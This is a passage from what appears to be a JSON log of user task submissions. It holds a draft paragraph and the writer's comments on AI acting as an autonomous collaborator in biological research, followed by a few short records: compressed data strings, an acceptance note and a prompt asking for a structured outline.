Some words may be changed:\nThe intersection of AI and biology is reshaping the way we approach scientific discovery. From gene editing to protein folding, AI has long supported research, but the next frontier goes beyond analysis. It involves building autonomous systems capable of driving biological breakthroughs. This shift reimagines AI not as a tool but as a collaborator. A system that can learn, hypothesize, and act with minimal human intervention.\n\n\nThis is a strong hook to the beginning to grab people in and is core to my thesis. The approach here suggest that AI and biology will play a huge role where agents can act autonomously doing various experiments to drive their without human intervention.\n\nHere\u2019s a link to the draft:\nhttps://docs.google.com/document/d/1uuC1vK9bsrPaMVzuPwReYngBiNtdsJKRRAOP0AfuFvI/edit?usp=sharing", "user": "kelsier_9", "task_timestamp": "2024-11-23_23:31__VG66"}, {"data": "chunk_1__COMPRESSED__G14A4AU8ZLGphWcGmnHA3l+ShtLQ5jH2niNJhlBJHLwOVL/uxuMQtt9A46Rdja74yAHSiAA=", "user": "l0ng_gamma_as1", "task_timestamp": "2024-12-02_05:57__LN53"}, {"data": "chunk_1__COMPRESSED__GzIA+I2Uq+1oQWW3nNYbJiXjJBQDFvU9bMABe5omNBDfcaBTkEVOBmy71+s+IM+erlNRuBowAQ==", "user": "l0ng_gamma_as1", "task_timestamp": "2024-12-02_05:54__UR54"}, {"data": "ACCEPTANCE REASON ___ I'm on it.", "user": "l0ng_gamma_as1", "task_timestamp": "2024-11-27_10:10__YI95"}, {"data": "PROPOSED PF ___ Write a structured outline for your updated context document, explicitly listing high-priority objectives, actionable workflows, and next steps.
